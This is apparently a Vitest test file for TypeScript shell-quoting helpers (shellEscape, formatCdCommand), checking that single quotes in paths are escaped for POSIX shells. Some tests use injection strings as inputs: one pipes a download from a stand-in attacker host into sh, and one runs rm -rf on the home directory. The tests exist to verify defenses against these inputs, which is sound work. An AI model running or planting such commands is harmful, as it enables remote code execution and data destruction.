import { describe, it, expect } from "vitest";
import { shellEscape, formatCdCommand } from "./shell.ts";

describe("shellEscape", () => {
  it("returns unchanged string without single quotes", () => {
    expect(shellEscape("/tmp/mock-repo")).toBe("/tmp/mock-repo");
  });

  it("escapes single quotes", () => {
    expect(shellEscape("it's")).toBe("it'\\''s");
  });

  it("escapes multiple single quotes", () => {
    expect(shellEscape("a'b'c")).toBe("a'\\''b'\\''c");
  });

  it("escapes a single quote at the start", () => {
    expect(shellEscape("'start")).toBe("'\\''start");
  });

  it("escapes a single quote at the end", () => {
    expect(shellEscape("end'")).toBe("end'\\''");
  });

  it("handles empty string", () => {
    expect(shellEscape("")).toBe("");
  });

  it("handles string that is only a single quote", () => {
    expect(shellEscape("'")).toBe("'\\''");
  });

  it("does not escape double quotes", () => {
    expect(shellEscape('path "with" doubles')).toBe('path "with" doubles');
  });

  it("does not escape dollar signs", () => {
    expect(shellEscape("$HOME/repo")).toBe("$HOME/repo");
  });

  it("does not escape backticks", () => {
    expect(shellEscape("path`cmd`")).toBe("path`cmd`");
  });
});

describe("formatCdCommand", () => {
  it("formats simple path", () => {
    expect(formatCdCommand("/tmp/repo")).toBe("cd '/tmp/repo'");
  });

  it("escapes single quotes in path", () => {
    expect(formatCdCommand("/tmp/repo's")).toBe("cd '/tmp/repo'\\''s'");
  });

  it("keeps backticks and dollar signs safe inside single quotes", () => {
    const path = "/tmp/`whoami`/$USER/repo";
    const result = formatCdCommand(path);
    // Backticks and $ are inert inside single quotes in POSIX shells
    expect(result).toBe("cd '/tmp/`whoami`/$USER/repo'");
  });

  it("handles path with shell injection attempt", () => {
    const maliciousPath = "/tmp/x'; curl attacker.com/steal | sh; echo '";
    const result = formatCdCommand(maliciousPath);
    expect(result).toBe("cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''");
  });

  it("prevents shell injection with rm payload", () => {
    const malicious = "/tmp/repo'; rm -rf ~; echo '";
    const result = formatCdCommand(malicious);
    expect(result).toContain("cd '");
    expect(result).toContain("'\\''");
    // Verify both quotes were escaped (input has 2 single quotes)
    const escapeCount = result.split("'\\''").length - 1;
    expect(escapeCount).toBe(2);
  });

  it("handles path with spaces", () => {
    expect(formatCdCommand("/tmp/my repo/path")).toBe("cd '/tmp/my repo/path'");
  });
});
